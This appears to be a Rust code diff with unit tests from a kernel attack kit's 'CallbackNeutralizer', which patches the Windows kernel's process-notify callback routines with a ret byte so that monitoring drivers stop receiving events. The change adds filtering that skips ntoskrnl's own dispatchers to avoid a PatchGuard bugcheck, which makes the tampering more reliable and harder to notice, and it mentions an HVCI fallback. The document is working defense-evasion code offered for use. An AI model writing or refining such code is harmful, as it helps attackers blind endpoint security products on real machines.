@@ -68,6 +68,14 @@ impl CallbackNeutralizer {
     ///   3. overwrite the function's entry byte with `ret` (0xC3).
     /// Returns the count of slots neutralized.
     ///
+    /// **Selective targeting (slot-0 / ntoskrnl skip):** slot[0] of each
+    /// Ps*NotifyRoutine array is the nt! internal dispatcher. Overwriting its
+    /// CODE with `ret` is a `.text` write that trips PatchGuard and bugchecks
+    /// the host (this is the dangerous code-write path — more certain to
+    /// triple-fault than `repurpose`'s data write). We skip it using the same
+    /// logic as `repurpose`: range-based ntoskrnl filtering when bounds are
+    /// resolved, else the slot[0] fallback.
+    ///
     /// # Safety contract (caller)
     /// The array KVAs in [`Self::runtime`] must be the live, runtime-resolved
     /// addresses (these drift across 17763 UBRs — a hardcoded RVA is a BSOD);
@@ -76,6 +84,13 @@ impl CallbackNeutralizer {
     fn neutralize_array(&self, krw: &dyn KernelRw, array: NotifyArray) -> Result<usize, KitError> {
         let base = self.array_kva(array)?;
         let mut count = 0usize;
+        // Range-based ntoskrnl filtering: skip any slot whose routine address
+        // falls inside the ntoskrnl image (nt! internal dispatchers —
+        // overwriting their CODE causes system instability and PatchGuard
+        // detection). When both bounds are 0 (bootstrap didn't resolve them),
+        // fall back to skipping only slot[0], the known dispatcher position.
+        let skip_ntoskrnl =
+            self.runtime.ntoskrnl_base != 0 && self.runtime.ntoskrnl_size != 0;
         for i in 0..notify_routines::ARRAY_LEN {
             let slot_kva = base + i * 8;
             let packed = krw.kread_u64(slot_kva).map_err(KitError::from)?;
@@ -100,6 +115,23 @@ impl CallbackNeutralizer {
             // address or a user-mode VA.
             if routine < 0xFFFF_8000_0000_0000 {
                 continue;
+            }
+            // Skip ntoskrnl internal dispatchers — overwriting their CODE with
+            // `ret` causes system instability, PatchGuard detection, and a
+            // near-certain bugcheck (this is the .text write path). Same logic
+            // as `repurpose`.
+            if skip_ntoskrnl {
+                // Range-based: skip if routine falls inside the ntoskrnl image.
+                if routine >= self.runtime.ntoskrnl_base
+                    && routine < self.runtime.ntoskrnl_base + self.runtime.ntoskrnl_size
+                {
+                    continue;
+                }
+            } else {
+                // Fallback: skip only slot[0], the known dispatcher position.
+                if i == 0 {
+                    continue;
+                }
             }
             // Overwrite the routine's first byte with `ret`. CODE page write —
             // HVCI may refuse; surface the error so the caller can repurpose.
@@ -360,8 +392,10 @@ mod tests {
         let ctx_b = 0x2000_2000usize;
         let routine_a = 0xFFFF_8000_0000_3000u64;
         let routine_b = 0xFFFF_8000_0000_4000u64;
-        // slot 0 and slot 3 occupied (low bit set), the rest empty.
-        krw.set_u64(array_kva + 0 * 8, ctx_a as u64 | 0x1);
+        // slot 1 and slot 3 occupied (low bit set), the rest empty. We avoid
+        // slot 0: without resolved ntoskrnl bounds the kit skips slot[0]
+        // (the nt! dispatcher position) to avoid a PatchGuard bugcheck.
+        krw.set_u64(array_kva + 1 * 8, ctx_a as u64 | 0x1);
         krw.set_u64(array_kva + 3 * 8, ctx_b as u64 | 0x1);
         // Each ctx's first QWORD = the routine address.
         krw.set_u64(ctx_a, routine_a);
@@ -385,9 +419,11 @@ mod tests {
     fn neutralize_skips_empty_and_null_slots() {
         let krw = MockKrw::new();
         let array_kva = 0x1000_0000usize;
-        // slot 0 occupied, slot 1 empty (0), slot 2 has ptr but no low bit.
-        krw.set_u64(array_kva + 0 * 8, 0x2000 as u64 | 0x1);
-        krw.set_u64(array_kva + 2 * 8, 0x3000 as u64); // no low bit
+        // slot 1 occupied, slot 2 empty (0), slot 3 has ptr but no low bit.
+        // (We use slot 1 rather than slot 0 because the slot-0 dispatcher
+        // is skipped to avoid a PatchGuard bugcheck.)
+        krw.set_u64(array_kva + 1 * 8, 0x2000 as u64 | 0x1);
+        krw.set_u64(array_kva + 3 * 8, 0x3000 as u64); // no low bit
                                                        // Phase 1.1: routine address must be in kernel VA range (≥0xFFFF_8000_0000_0000)
         krw.set_u64(0x2000, 0xFFFF_8000_0000_5000);
 
@@ -399,8 +435,69 @@ mod tests {
         let n = kit
             .neutralize_array(&krw, NotifyArray::CreateProcess)
             .unwrap();
-        assert_eq!(n, 1); // only slot 0
+        assert_eq!(n, 1); // only slot 1
         assert_eq!(krw.get_byte(0xFFFF_8000_0000_5000), 0xC3);
+    }
+
+    /// slot[0] (the nt! dispatcher) MUST be skipped on the dangerous code-write
+    /// path: overwriting its `.text` trips PatchGuard and bugchecks the host.
+    /// This test entrenches that slot-0 is never neutralized.
+    #[test]
+    fn neutralize_skips_slot_zero_dispatcher() {
+        let krw = MockKrw::new();
+        let array_kva = 0x1000_0000usize;
+        let ctx = 0x2000_1000usize;
+        let routine = 0xFFFF_8000_0000_3000u64;
+        // Only slot 0 is occupied — without ntoskrnl bounds the kit skips it.
+        krw.set_u64(array_kva + 0 * 8, ctx as u64 | 0x1);
+        krw.set_u64(ctx, routine);
+
+        let runtime = RuntimeOffsets {
+            create_process_notify_array_kva: array_kva,
+            ..Default::default()
+        };
+        let kit = CallbackNeutralizer { runtime };
+        let n = kit
+            .neutralize_array(&krw, NotifyArray::CreateProcess)
+            .unwrap();
+        assert_eq!(n, 0); // slot 0 skipped — nothing neutralized
+        // The routine's entry byte is untouched.
+        assert_eq!(krw.get_byte(routine as usize), 0x0);
+    }
+
+    /// With resolved ntoskrnl bounds, the range-based filter skips any routine
+    /// that falls inside the ntoskrnl image (not just slot 0).
+    #[test]
+    fn neutralize_skips_routines_inside_ntoskrnl_bounds() {
+        let krw = MockKrw::new();
+        let array_kva = 0x1000_0000usize;
+        let nt_base = 0xFFFF_F800_0000_0000usize;
+        let nt_size = 0x0040_0000usize; // 4 MiB
+        let ctx_inside = 0x2000_1000usize;
+        let ctx_outside = 0x2000_2000usize;
+        // routine_inside falls inside [nt_base, nt_base + nt_size).
+        let routine_inside = (nt_base + 0x1000) as u64;
+        // routine_outside is in kernel range but outside ntoskrnl.
+        let routine_outside = 0xFFFF_8000_0000_4000u64;
+        krw.set_u64(array_kva + 1 * 8, ctx_inside as u64 | 0x1);
+        krw.set_u64(array_kva + 2 * 8, ctx_outside as u64 | 0x1);
+        krw.set_u64(ctx_inside, routine_inside);
+        krw.set_u64(ctx_outside, routine_outside);
+
+        let runtime = RuntimeOffsets {
+            create_process_notify_array_kva: array_kva,
+            ntoskrnl_base: nt_base,
+            ntoskrnl_size: nt_size,
+            ..Default::default()
+        };
+        let kit = CallbackNeutralizer { runtime };
+        let n = kit
+            .neutralize_array(&krw, NotifyArray::CreateProcess)
+            .unwrap();
+        assert_eq!(n, 1); // only the outside routine
+        // The ntoskrnl-internal routine is untouched.
+        assert_eq!(krw.get_byte(routine_inside as usize), 0x0);
+        assert_eq!(krw.get_byte(routine_outside as usize), 0xC3);
     }
 
     #[test]
